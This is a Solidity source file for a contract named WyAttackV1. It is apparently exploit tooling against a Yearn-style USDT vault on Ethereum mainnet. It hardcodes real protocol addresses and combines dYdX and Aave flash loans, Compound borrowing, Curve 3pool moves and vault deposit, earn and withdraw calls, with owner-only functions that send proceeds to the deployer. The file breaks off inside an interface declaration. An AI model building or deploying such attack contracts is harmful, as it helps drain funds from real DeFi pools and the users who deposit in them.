pragma solidity 0.7.4;
pragma experimental ABIEncoderV2;

// -- DydxFlashloanBase -- //

contract DydxFlashloanBase {
    using SafeMath for uint256;

    function _getMarketIdFromTokenAddress(address _solo, address token)
        internal
        view
        returns (uint256)
    {
        ISoloMargin solo = ISoloMargin(_solo);
        uint256 numMarkets = solo.getNumMarkets();
        address curToken;
        for (uint256 i = 0; i < numMarkets; i++) {
            curToken = solo.getMarketTokenAddress(i);
            if (curToken == token) {
                return i;
            }
        }
        revert("No marketId found for provided token");
    }

    function _getRepaymentAmountInternal(uint256 amount)
        internal
        pure
        returns (uint256)
    {
        return amount.add(2);
    }

    function _getAccountInfo() internal view returns (Account.Info memory) {
        return Account.Info({owner: address(this), number: 1});
    }

    function _getWithdrawAction(uint marketId, uint256 amount)
        internal
        view
        returns (Actions.ActionArgs memory)
    {
        return
            Actions.ActionArgs({
                actionType: Actions.ActionType.Withdraw,
                accountId: 0,
                amount: Types.AssetAmount({
                    sign: false,
                    denomination: Types.AssetDenomination.Wei,
                    ref: Types.AssetReference.Delta,
                    value: amount
                }),
                primaryMarketId: marketId,
                secondaryMarketId: 0,
                otherAddress: address(this),
                otherAccountId: 0,
                data: ""
            });
    }

    function _getCallAction(bytes memory data)
        internal
        view
        returns (Actions.ActionArgs memory)
    {
        return
            Actions.ActionArgs({
                actionType: Actions.ActionType.Call,
                accountId: 0,
                amount: Types.AssetAmount({
                    sign: false,
                    denomination: Types.AssetDenomination.Wei,
                    ref: Types.AssetReference.Delta,
                    value: 0
                }),
                primaryMarketId: 0,
                secondaryMarketId: 0,
                otherAddress: address(this),
                otherAccountId: 0,
                data: data
            });
    }

    function _getDepositAction(uint marketId, uint256 amount)
        internal
        view
        returns (Actions.ActionArgs memory)
    {
        return
            Actions.ActionArgs({
                actionType: Actions.ActionType.Deposit,
                accountId: 0,
                amount: Types.AssetAmount({
                    sign: true,
                    denomination: Types.AssetDenomination.Wei,
                    ref: Types.AssetReference.Delta,
                    value: amount
                }),
                primaryMarketId: marketId,
                secondaryMarketId: 0,
                otherAddress: address(this),
                otherAccountId: 0,
                data: ""
            });
    }
}

// -- AAVE -- //

contract FlashLoanReceiverBase {
    address constant ETHADDRESS = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;
    ILendingPoolAddressesProvider addressesProvider;

    function transferFundsBackToPoolInternal(address _reserve, uint256 _amount)
        internal
    {
        address payable core = addressesProvider.getLendingPoolCore();
        transferInternal(core, _reserve, _amount);
    }

    function transferInternal(
        address payable _destination,
        address _reserve,
        uint256 _amount
    ) internal {
        if (_reserve == ETHADDRESS) {
            //solium-disable-next-line
            _destination.call{value:_amount}("");
            return;
        }
        IERC20(_reserve).transfer(_destination, _amount);
    }

    function getBalanceInternal(address _target, address _reserve)
        internal
        view
        returns (uint256)
    {
        if (_reserve == ETHADDRESS) {
            return _target.balance;
        }
        return IERC20(_reserve).balanceOf(_target);
    }
}

// -- WyAttackV1 -- //

contract WyAttackV1 is DydxFlashloanBase, FlashLoanReceiverBase{
    using SafeMath for uint256;
    using SafeERC20 for IERC20;
    using address_make_payable for address;

    struct MyCustomData {
        address token;
        uint256 repayAmount;
    }

    address superMan;

    address dydxAddress;
    address curve3PoolAddress;
    address aaveAddress;
    address USDTVaultAddress;
    address ComptrollerAddress;
    address CompPriceFeed;
    address WETHAddress;
    address DAIAddress;
    address USDCAddress;
    address USDTAddress;
    address CETHAddress;
    address WBTCAddress;
    address CWBTCAddress;

    constructor (uint if_mainnet) public {
        superMan = address(tx.origin);
        if (if_mainnet == 1) {
            // Mainnet
            dydxAddress = 0x1E0447b19BB6EcFdAe1e4AE1694b0C3659614e4e;
            curve3PoolAddress = 0xbEbc44782C7dB0a1A60Cb6fe97d0b483032FF1C7;
            aaveAddress = 0x24a42fD28C976A61Df5D00D0599C34c4f90748c8;
            USDTVaultAddress = 0x2f08119C6f07c006695E079AAFc638b8789FAf18;
            ComptrollerAddress = 0x3d9819210A31b4961b30EF54bE2aeD79B9c9Cd3B;
            CompPriceFeed = 0x922018674c12a7F0D394ebEEf9B58F186CdE13c1;
            WETHAddress = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
            DAIAddress = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
            USDCAddress = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
            USDTAddress = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
            CETHAddress = 0x4Ddc2D193948926D02f9B1fE9e1daa0718270ED5;
            WBTCAddress = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;
            CWBTCAddress = 0xC11b1268C1A384e55C48c2391d8d480264A3A7F4;
        } else {
            // Kovan
            dydxAddress = 0x4EC3570cADaAEE08Ae384779B0f3A45EF85289DE;
            curve3PoolAddress = 0xbEbc44782C7dB0a1A60Cb6fe97d0b483032FF1C7;
            USDTVaultAddress = 0x2f08119C6f07c006695E079AAFc638b8789FAf18;
            aaveAddress = 0x506B0B2CF20FAA8f38a4E2B524EE43e1f4458Cc5;
            ComptrollerAddress = 0x5eAe89DC1C671724A672ff0630122ee834098657;
            CompPriceFeed = 0xbBdE93962Ca9fe39537eeA7380550ca6845F8db7;
            WETHAddress = 0xd0A1E359811322d97991E03f863a0C30C2cF029C;
            DAIAddress = 0x4F96Fe3b7A6Cf9725f59d353F723c1bDb64CA6Aa;
            USDCAddress = 0xb7a4F3E9097C08dA09517b5aB877F7a917224ede;
            USDTAddress = 0x07de306FF27a2B630B1141956844eB1552B956B5;
            CETHAddress = 0x41B5844f4680a8C38fBb695b7F9CFd1F64474a72;
            WBTCAddress = 0xd3A691C852CDB01E281545A27064741F0B7f6825;
            CWBTCAddress = 0xa1fAA15655B0e7b6B6470ED3d096390e6aD93Abb;
        }
        addressesProvider = ILendingPoolAddressesProvider(aaveAddress);
    }

    //  dydx闪电贷实现操作
    function callFunction(
        address sender,
        Account.Info memory account,
        bytes memory data
    ) public {
        MyCustomData memory mcd = abi.decode(data, (MyCustomData));
        uint256 tokenBalanceBefore = IERC20(mcd.token).balanceOf(address(this));

        // WETH兑换成ETH
        WETH9(WETHAddress).withdraw(tokenBalanceBefore);

        // ETH兑换成WETH
        WETH9(WETHAddress).deposit{value:mcd.repayAmount}();

        // 检查归还数量
        uint256 balOfLoanedToken = IERC20(mcd.token).balanceOf(address(this));
        require(balOfLoanedToken >= mcd.repayAmount, "Not enough funds to repay dydx loan!");
    }

    // 发起dydx闪电贷
    function initiateDydxFlashLoan(uint256 _amount)
        external
    {
        ISoloMargin solo = ISoloMargin(dydxAddress);
        uint256 marketId = _getMarketIdFromTokenAddress(dydxAddress, WETHAddress);
        uint256 repayAmount = _getRepaymentAmountInternal(_amount);
        IERC20(WETHAddress).approve(dydxAddress, repayAmount);

        Actions.ActionArgs[] memory operations = new Actions.ActionArgs[](3);
        operations[0] = _getWithdrawAction(marketId, _amount);
        operations[1] = _getCallAction(
            abi.encode(MyCustomData({token: WETHAddress, repayAmount: repayAmount}))
        );
        operations[2] = _getDepositAction(marketId, repayAmount);

        Account.Info[] memory accountInfos = new Account.Info[](1);
        accountInfos[0] = _getAccountInfo();

        solo.operate(accountInfos, operations);
    }

    // AAVE闪电贷实现操作
    function executeOperation (
        address _reserve,
        uint _amount,
        uint _fee,
        bytes calldata _params
    ) external {
        MyCustomData memory mcd = abi.decode(_params, (MyCustomData));

        // 检查归还数量
        uint256 balOfLoanedToken = IERC20(_reserve).balanceOf(address(this));
        require(balOfLoanedToken >= _amount.add(_fee),  "Not enough funds to repay aave loan!");
        transferFundsBackToPoolInternal(_reserve, _amount.add(_fee));
    }

    // 发起AAVE闪电贷
    function initateAaveFlashLoan(
        address assetToFlashLoan,
        uint amountToLoan
    ) external {
        ILendingPool lendingPool = ILendingPool(addressesProvider.getLendingPool());

        lendingPool.flashLoan(
            address(this),
            assetToFlashLoan,
            amountToLoan,
            abi.encode(MyCustomData({token: assetToFlashLoan, repayAmount: amountToLoan}))
        );
    }

    // Compound 存入ETH 得到cETH
    function supplyEthToCompound(uint256 amount) public {
        CEth cToken = CEth(payable(CETHAddress));

        cToken.mint{value:amount}();
    }

    // Compound 存入ERC20 得到cERC20
    function supplyErc20ToCompound(address erc20Contract, address cErc20Contract, uint256 amount) public {
        IERC20 underlying = IERC20(erc20Contract);
        CErc20 cToken = CErc20(cErc20Contract);

        underlying.approve(cErc20Contract, amount);
        cToken.mint(amount);
    }

    // Compound 归还cETH 赎回ETH
    function redeemCEth(uint256 amount, bool redeemType) public {
        CEth cToken = CEth(CETHAddress);
        uint256 redeemResult;

        if (redeemType == true) {
            // amount=归还cETH的数量
            redeemResult = cToken.redeem(amount);
        } else {
            // amount=要赎回的ETH的数量
            redeemResult = cToken.redeemUnderlying(amount);
        }
        require(redeemResult==0, "redeemCEth error");
    }

    // Compound 归还cERC20 赎回ERC20
    function redeemCErc20Tokens(uint256 amount, bool redeemType, address cErc20Contract) public {
        CErc20 cToken = CErc20(cErc20Contract);
        uint256 redeemResult;

        if (redeemType == true) {
            // amount=归还cERC20的数量
            redeemResult = cToken.redeem(amount);
        } else {
            // amount=要赎回的ERC20的数量
            redeemResult = cToken.redeemUnderlying(amount);
        }
        require(redeemResult==0, "redeemCErc20Tokens error");
    }

    // Compound 以cETH和cERC20作为抵押 进入借贷市场
    function enterCompoundMarkets(address collateral_cTokenAddress) public {
        Comptroller comptroller = Comptroller(ComptrollerAddress);

        // 携带cETH和cERC20进入市场
        address[] memory cTokens = new address[](2);
        cTokens[0] = CETHAddress;
        cTokens[1] = collateral_cTokenAddress;
        uint256[] memory errors = comptroller.enterMarkets(cTokens);
        if (errors[0] != 0) {
            revert("Comptroller.enterMarkets failed.");
        }
    }

    // Compound 以cETH和cERC20作为抵押 借出目标ERC20
    function BorrowERC20FromCompound(
        address cTokenAddress,
        uint underlyingDecimals,
        uint256 borrow_ratio
    ) public returns (uint256){
        CErc20 cToken = CErc20(cTokenAddress);

        // 获取账户流动性
        (uint256 error,
        uint256 liquidity,
        uint256 shortfall) = Comptroller(ComptrollerAddress).getAccountLiquidity(address(this));
        if (error != 0) {
            revert("Comptroller.getAccountLiquidity failed.");
        }
        require(shortfall == 0, "account underwater");
        require(liquidity > 0, "account has excess collateral");

        // 能借出的最大个数 (DAI/USDT/USDC的价格都是1usd liquidity:以美元计价的账户流动性 单位是wei)
        uint256 maxBorrowUnderlying = liquidity.div(1e18);

        // 借出最大数量的比例(%)
        uint256 borrowAmount = (maxBorrowUnderlying.mul(borrow_ratio).div(100)) * 10**underlyingDecimals;
        uint256 balanceOfLender = cToken.balanceOfUnderlying(cTokenAddress);
        if (borrowAmount > balanceOfLender) {
            borrowAmount = balanceOfLender;
        }

        // 开始借出
        error = cToken.borrow(borrowAmount);
        require(error == 0, "BorrowERC20FromCompound Error");

        // 返回借出数量
        return cToken.borrowBalanceCurrent(address(this));
    }

    // Compound 归还ERC20
    function returnErc20toCompound(address _erc20Address, address _cErc20Address, uint256 amount) public {
        IERC20 underlying = IERC20(_erc20Address);
        CErc20 cToken = CErc20(_cErc20Address);

        underlying.approve(_cErc20Address, amount);
        uint256 error = cToken.repayBorrow(amount);

        require(error == 0, "returnErc20toCompound Error");
    }

    // get
    function getSuperMan() public view returns(address) {
        return superMan;
    }

    function getETHBalance() public view returns(uint256) {
        return address(this).balance;
    }

    function getDydxAddress() public view returns(address) {
        return dydxAddress;
    }

    function getAaveAddress() public view returns(address) {
        return addressesProvider.getLendingPool();
    }

    function getAaveCoreAddress() public view returns(address) {
        return addressesProvider.getLendingPoolCore();
    }

    function getCurve3PoolAddress() public view returns(address) {
        return curve3PoolAddress;
    }

    function getUSDTVaultAddress() public view returns(address) {
        return USDTVaultAddress;
    }

    function getUSDTVaultShares() public view returns(uint256) {
        return IERC20(USDTVaultAddress).balanceOf(address(this));
    }

    function getWETHAddress() public view returns(address) {
        return WETHAddress;
    }

    function getDAIAddress() public view returns(address) {
        return DAIAddress;
    }

    function getUSDCAddress() public view returns(address) {
        return USDCAddress;
    }

    function getUSDTAddress() public view returns(address) {
        return USDTAddress;
    }

    // set
    function turnOutToken(address token, uint256 amount) public onlyOwner {
        IERC20(token).safeTransfer(superMan, amount);
    }

    function transferToken(address token, address recipient, uint256 amount) public onlyOwner {
        IERC20(token).safeTransfer(recipient, amount);
    }

    function turnOutETH(uint256 amount) public onlyOwner {
        address payable addr = superMan.make_payable();
        addr.transfer(amount);
    }

    function transferETH(address recipient, uint256 amount) public onlyOwner {
        address payable addr = recipient.make_payable();
        addr.transfer(amount);
    }

    function WETHToETH(uint256 _amount) public onlyOwner {
        WETH9(WETHAddress).withdraw(_amount);
    }

    function ETHtoWETH(uint256 _amount) public onlyOwner {
        WETH9(WETHAddress).deposit{value:_amount}();
    }

    function depositToCurve(uint256 _dai_amount, uint256 _usdc_amount, uint256 _usdt_amount) public {
        IERC20(DAIAddress).approve(curve3PoolAddress, _dai_amount);
        IERC20(USDCAddress).approve(curve3PoolAddress, _usdc_amount);
        IERC20(USDTAddress).approve(curve3PoolAddress, _usdt_amount);
        ICurveFi(curve3PoolAddress).add_liquidity([_dai_amount, _usdc_amount, _usdt_amount], 0);
    }

    function withdrawDaiFromCurve(uint256 amount) public {
        ICurveFi(curve3PoolAddress).remove_liquidity_one_coin(amount, 0, 0);
    }

    function withdrawUSDCFromCurve(uint256 amount) public {
        ICurveFi(curve3PoolAddress).remove_liquidity_one_coin(amount, 1, 0);
    }

    function withdrawUSDTFromCurve(uint256 amount) public {
        ICurveFi(curve3PoolAddress).remove_liquidity_one_coin(amount, 2, 0);
    }

    function depositToUSDTVault(uint256 amount) public {
        IERC20(USDTAddress).approve(USDTVaultAddress, amount);
        IYVault(USDTVaultAddress).deposit(amount);
    }

    function withdrawFromUSDTVault(uint256 shares) public {
        IYVault(USDTVaultAddress).withdraw(shares);
    }

    function LetUSDTVaultEarn() public {
        IYVault(USDTVaultAddress).earn();
    }

    modifier onlyOwner(){
        require(address(msg.sender) == superMan, "No authority");
        _;
    }

    receive() external payable {}
}

// -- interface -- //

interface WETH9 {
    function deposit() external payable;
    function withdraw(uint wad) external;
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface CErc20 {
    function mint(uint256) external returns (uint256);
    function exchangeRateCurrent() external returns (uint256);
    function supplyRatePerBlock() external returns (uint256);
    function redeem(uint) external returns (uint);
    function redeemUnderlying(uint) external returns (uint);
    function borrow(uint256) external returns (uint256);
    function borrowRatePerBlock() external view returns (uint256);
    function borrowBalanceCurrent(address) external returns (uint256);
    function repayBorrow(uint256) external returns (uint256);
    function balanceOfUnderlying(address) external returns (uint);
}

interface CEth {
    function mint() external payable;
    function exchangeRateCurrent() external returns (uint256);
    function supplyRatePerBlock() external returns (uint256);
    function redeem(uint) external returns (uint);
    function redeemUnderlying(uint) external returns (uint);
    function borrow(uint256) external returns (uint256);
    function repayBorrow() external payable;
    function borrowBalanceCurrent(address) external returns (uint256);
}

interface UniswapV2Router {
	
    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);
     function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
}

interface ICurveFi {
    function get_virtual_price() external view returns (uint256);

    function add_liquidity(
        // EURs
        uint256[2] calldata amounts,
        uint256 min_mint_amount
    ) external;

    function add_liquidity(
        // sBTC pool
        uint256[3] calldata amounts,
        uint256 min_mint_amount
    ) external;

    function add_liquidity(
        // bUSD pool
        uint256[4] calldata amounts,
        uint256 min_mint_amount
    ) external;

    function remove_liquidity_imbalance(uint256[4] calldata amounts, uint256 max_burn_amount) external;

    function remove_liquidity(uint256 _amount, uint256[4] calldata amounts) external;

    function remove_liquidity_one_coin(
        uint256 _token_amount,
        int128 i,
        uint256 min_amount
    ) external;

    function exchange(
        int128 from,
        int128 to,
        uint256 _from_amount,
        uint256 _min_to_amount
    ) external;

    function exchange_underlying(
        int128 from,
        int128 to,
        uint256 _from_amount,
        uint256 _min_to_amount
    ) external;

    function balances(int128) external view returns (uint256);

    function get_dy(
        int128 from,
        int128 to,
        uint256 _from_amount
    ) external view returns (uint256);
}

interface ILendingPool {
  function addressesProvider () external view returns ( address );
  function deposit ( address _reserve, uint256 _amount, uint16 _referralCode ) external payable;
  function redeemUnderlying ( address _reserve, address _user, uint256 _amount ) external;
  function borrow ( address _reserve, uint256 _amount, uint256 _interestRateMode, uint16 _referralCode ) external;
  function repay ( address _reserve, uint256 _amount, address _onBehalfOf ) external payable;
  function swapBorrowRateMode ( address _reserve ) external;
  function rebalanceFixedBorrowRate ( address _reserve, address _user ) external;
  function setUserUseReserveAsCollateral ( address _reserve, bool _useAsCollateral ) external;
  function liquidationCall ( address _collateral, address _reserve, address _user, uint256 _purchaseAmount, bool _receiveAToken ) external payable;
  function flashLoan ( address _receiver, address _reserve, uint256 _amount, bytes calldata _params ) external;
  function getReserveConfigurationData ( address _reserve ) external view returns ( uint256 ltv, uint256 liquidationThreshold, uint256 liquidationDiscount, address interestRateStrategyAddress, bool usageAsCollateralEnabled, bool borrowingEnabled, bool fixedBorrowRateEnabled, bool isActive );
  function getReserveData ( address _reserve ) external view returns ( uint256 totalLiquidity, uint256 availableLiquidity, uint256 totalBorrowsFixed, uint256 totalBorrowsVariable, uint256 liquidityRate, uint256 variableBorrowRate, uint256 fixedBorrowRate, uint256 averageFixedBorrowRate, uint256 utilizationRate, uint256 liquidityIndex, uint256 variableBorrowIndex, address aTokenAddress, uint40 lastUpdateTimestamp );
  function getUserAccountData ( address _user ) external view returns ( uint256 totalLiquidityETH, uint256 totalCollateralETH, uint256 totalBorrowsETH, uint256 availableBorrowsETH, uint256 currentLiquidationThreshold, uint256 ltv, uint256 healthFactor );
  function getUserReserveData ( address _reserve, address _user ) external view returns ( uint256 currentATokenBalance, uint256 currentUnderlyingBalance, uint256 currentBorrowBalance, uint256 principalBorrowBalance, uint256 borrowRateMode, uint256 borrowRate, uint256 liquidityRate, uint256 originationFee, uint256 variableBorrowIndex, uint256 lastUpdateTimestamp, bool usageAsCollateralEnabled );
  function getReserves () external view;
}

interface ILendingPoolAddressesProvider {
    function getLendingPool() external view returns (address);
    function setLendingPoolImpl(address _pool) external;

    function getLendingPoolCore() external view returns (address payable);
    function setLendingPoolCoreImpl(address _lendingPoolCore) external;

    function getLendingPoolConfigurator() external view returns (address);
    function setLendingPoolConfiguratorImpl(address _configurator) external;

    function getLendingPoolDataProvider() external view returns (address);
    function setLendingPoolDataProviderImpl(address _provider) external;

    function getLendingPoolParametersProvider() external view returns (address);
    function setLendingPoolParametersProviderImpl(address _parametersProvider) external;

    function getTokenDistributor() external view returns (address);
    function setTokenDistributor(address _tokenDistributor) external;

    function getFeeProvider() external view returns (address);
    function setFeeProviderImpl(address _feeProvider) external;

    function getLendingPoolLiquidationManager() external view returns (address);
    function setLendingPoolLiquidationManager(address _manager) external;

    function getLendingPoolManager() external view returns (address);
    function setLendingPoolManager(address _lendingPoolManager) external;

    function getPriceOracle() external view returns (address);
    function setPriceOracle(address _priceOracle) external;

    function getLendingRateOracle() external view returns (address);
    function setLendingRateOracle(address _lendingRateOracle) external;
}

interface IYVault {
    function deposit(uint256 _amount) external;
    function withdraw(uint256 _shares) external;
    function earn() external;
}

interface Comptroller {
    function markets(address) external returns (bool, uint256);

    function enterMarkets(address[] calldata)
        external
        returns (uint256[] memory);

    function getAccountLiquidity(address)
        external
        view
        returns (uint256, uint256, uint256);
}

interface PriceFeed {
    function getUnderlyingPrice(address cToken) external view returns (uint);
}

// -- library -- //

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }
    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

library Address {
    function isContract(address account) internal view returns (bool) {
        bytes32 codehash;
        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
        assembly { codehash := extcodehash(account) }
        return (codehash != accountHash && codehash != 0x0);
    }
    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");
        (bool success, ) = recipient.call{value:amount}("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }
}

library SafeERC20 {
    using SafeMath for uint256;
    using Address for address;

    function safeTransfer(IERC20 token, address to, uint256 value) internal {
        callOptionalReturn(token, abi.encodeWithSelector(token.transfer.selector, to, value));
    }

    function safeTransferFrom(IERC20 token, address from, address to, uint256 value) internal {
        callOptionalReturn(token, abi.encodeWithSelector(token.transferFrom.selector, from, to, value));
    }

    function safeApprove(IERC20 token, address spender, uint256 value) internal {
        require((value == 0) || (token.allowance(address(this), spender) == 0),
            "SafeERC20: approve from non-zero to non-zero allowance"
        );
        callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, value));
    }

    function safeIncreaseAllowance(IERC20 token, address spender, uint256 value) internal {
        uint256 newAllowance = token.allowance(address(this), spender).add(value);
        callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, newAllowance));
    }

    function safeDecreaseAllowance(IERC20 token, address spender, uint256 value) internal {
        uint256 newAllowance = token.allowance(address(this), spender).sub(value, "SafeERC20: decreased allowance below zero");
        callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, newAllowance));
    }
    function callOptionalReturn(IERC20 token, bytes memory data) private {
        require(address(token).isContract(), "SafeERC20: call to non-contract");
        (bool success, bytes memory returndata) = address(token).call(data);
        require(success, "SafeERC20: low-level call failed");
        if (returndata.length > 0) {
            require(abi.decode(returndata, (bool)), "SafeERC20: ERC20 operation did not succeed");
        }
    }
}

library address_make_payable {
   function make_payable(address x) internal pure returns (address payable) {
      return address(uint160(x));
   }
}

library Account {
    enum Status {Normal, Liquid, Vapor}
    struct Info {
        address owner; // The address that owns the account
        uint256 number; // A nonce that allows a single address to control many accounts
    }
    struct Storage {
        mapping(uint256 => Types.Par) balances; // Mapping from marketId to principal
        Status status;
    }
}

library Actions {
    enum ActionType {
        Deposit, // supply tokens
        Withdraw, // borrow tokens
        Transfer, // transfer balance between accounts
        Buy, // buy an amount of some token (publicly)
        Sell, // sell an amount of some token (publicly)
        Trade, // trade tokens against another account
        Liquidate, // liquidate an undercollateralized or expiring account
        Vaporize, // use excess tokens to zero-out a completely negative account
        Call // send arbitrary data to an address
    }

    enum AccountLayout {OnePrimary, TwoPrimary, PrimaryAndSecondary}

    enum MarketLayout {ZeroMarkets, OneMarket, TwoMarkets}

    struct ActionArgs {
        ActionType actionType;
        uint256 accountId;
        Types.AssetAmount amount;
        uint256 primaryMarketId;
        uint256 secondaryMarketId;
        address otherAddress;
        uint256 otherAccountId;
        bytes data;
    }

    struct DepositArgs {
        Types.AssetAmount amount;
        Account.Info account;
        uint256 market;
        address from;
    }

    struct WithdrawArgs {
        Types.AssetAmount amount;
        Account.Info account;
        uint256 market;
        address to;
    }

    struct TransferArgs {
        Types.AssetAmount amount;
        Account.Info accountOne;
        Account.Info accountTwo;
        uint256 market;
    }

    struct BuyArgs {
        Types.AssetAmount amount;
        Account.Info account;
        uint256 makerMarket;
        uint256 takerMarket;
        address exchangeWrapper;
        bytes orderData;
    }

    struct SellArgs {
        Types.AssetAmount amount;
        Account.Info account;
        uint256 takerMarket;
        uint256 makerMarket;
        address exchangeWrapper;
        bytes orderData;
    }

    struct TradeArgs {
        Types.AssetAmount amount;
        Account.Info takerAccount;
        Account.Info makerAccount;
        uint256 inputMarket;
        uint256 outputMarket;
        address autoTrader;
        bytes tradeData;
    }

    struct LiquidateArgs {
        Types.AssetAmount amount;
        Account.Info solidAccount;
        Account.Info liquidAccount;
        uint256 owedMarket;
        uint256 heldMarket;
    }

    struct VaporizeArgs {
        Types.AssetAmount amount;
        Account.Info solidAccount;
        Account.Info vaporAccount;
        uint256 owedMarket;
        uint256 heldMarket;
    }

    struct CallArgs {
        Account.Info account;
        address callee;
        bytes data;
    }
}

library Decimal {
    struct D256 {
        uint256 value;
    }
}

library Interest {
    struct Rate {
        uint256 value;
    }

    struct Index {
        uint96 borrow;
        uint96 supply;
        uint32 lastUpdate;
    }
}

library Monetary {
    struct Price {
        uint256 value;
    }
    struct Value {
        uint256 value;
    }
}

library Storage {
    // All information necessary for tracking a market
    struct Market {
        // Contract address of the associated ERC20 token
        address token;
        // Total aggregated supply and borrow amount of the entire market
        Types.TotalPar totalPar;
        // Interest index of the market
        Interest.Index index;
        // Contract address of the price oracle for this market
        address priceOracle;
        // Contract address of the interest setter for this market
        address interestSetter;
        // Multiplier on the marginRatio for this market
        Decimal.D256 marginPremium;
        // Multiplier on the liquidationSpread for this market
        Decimal.D256 spreadPremium;
        // Whether additional borrows are allowed for this market
        bool isClosing;
    }

    // The global risk parameters that govern the health and security of the system
    struct RiskParams {
        // Required ratio of over-collateralization
        Decimal.D256 marginRatio;
        // Percentage penalty incurred by liquidated accounts
        Decimal.D256 liquidationSpread;
        // Percentage of the borrower's interest fee that gets passed to the suppliers
        Decimal.D256 earningsRate;
        // The minimum absolute borrow value of an account
        // There must be sufficient incentivize to liquidate undercollateralized accounts
        Monetary.Value minBorrowedValue;
    }

    // The maximum RiskParam values that can be set
    struct RiskLimits {
        uint64 marginRatioMax;
        uint64 liquidationSpreadMax;
        uint64 earningsRateMax;
        uint64 marginPremiumMax;
        uint64 spreadPremiumMax;
        uint128 minBorrowedValueMax;
    }

    // The entire storage state of Solo
    struct State {
        // number of markets
        uint256 numMarkets;
        // marketId => Market
        mapping(uint256 => Market) markets;
        // owner => account number => Account
        mapping(address => mapping(uint256 => Account.Storage)) accounts;
        // Addresses that can control other users accounts
        mapping(address => mapping(address => bool)) operators;
        // Addresses that can control all users accounts
        mapping(address => bool) globalOperators;
        // mutable risk parameters of the system
        RiskParams riskParams;
        // immutable risk limits of the system
        RiskLimits riskLimits;
    }
}

library Types {
    enum AssetDenomination {
        Wei, // the amount is denominated in wei
        Par // the amount is denominated in par
    }

    enum AssetReference {
        Delta, // the amount is given as a delta from the current value
        Target // the amount is given as an exact number to end up at
    }

    struct AssetAmount {
        bool sign; // true if positive
        AssetDenomination denomination;
        AssetReference ref;
        uint256 value;
    }

    struct TotalPar {
        uint128 borrow;
        uint128 supply;
    }

    struct Par {
        bool sign; // true if positive
        uint128 value;
    }

    struct Wei {
        bool sign; // true if positive
        uint256 value;
    }
}

abstract contract ISoloMargin{
    struct OperatorArg {
        address operator;
        bool trusted;
    }

    function ownerSetSpreadPremium(
        uint256 marketId,
        Decimal.D256 memory spreadPremium
    ) public virtual;

    function getIsGlobalOperator(address operator) public virtual returns (bool);

    function getMarketTokenAddress(uint256 marketId)
        public
        virtual
        view
        returns (address);

    function ownerSetInterestSetter(uint256 marketId, address interestSetter)
        public virtual;

    function getAccountValues(Account.Info memory account)
        public
        virtual
        returns (Monetary.Value memory, Monetary.Value memory);

    function getMarketPriceOracle(uint256 marketId)
        public
        virtual
        returns (address);

    function getMarketInterestSetter(uint256 marketId)
        public
        virtual
        returns (address);

    function getMarketSpreadPremium(uint256 marketId)
        public
        virtual
        returns (Decimal.D256 memory);

    function getNumMarkets() public view virtual returns (uint256);

    function ownerWithdrawUnsupportedTokens(address token, address recipient)
        public
        virtual
        returns (uint256);

    function ownerSetMinBorrowedValue(Monetary.Value memory minBorrowedValue)
        public
        virtual;

    function ownerSetLiquidationSpread(Decimal.D256 memory spread) public virtual;

    function ownerSetEarningsRate(Decimal.D256 memory earningsRate) public virtual;

    function getIsLocalOperator(address owner, address operator)
        public
        virtual
        returns (bool);

    function getAccountPar(Account.Info memory account, uint256 marketId)
        public
        virtual
        returns (Types.Par memory);

    function ownerSetMarginPremium(
        uint256 marketId,
        Decimal.D256 memory marginPremium
    ) public
    virtual;

    function getMarginRatio() public virtual returns (Decimal.D256 memory);

    function getMarketCurrentIndex(uint256 marketId)
        public
        virtual
        returns (Interest.Index memory);

    function getMarketIsClosing(uint256 marketId) public virtual returns (bool);

    function getRiskParams() public virtual returns (Storage.RiskParams memory);

    function getAccountBalances(Account.Info memory account)
        public
        virtual
        returns (address[] memory, Types.Par[] memory, Types.Wei[] memory);

    function renounceOwnership() public virtual;

    function getMinBorrowedValue() public virtual returns (Monetary.Value memory);

    function setOperators(OperatorArg[] memory args) public virtual;
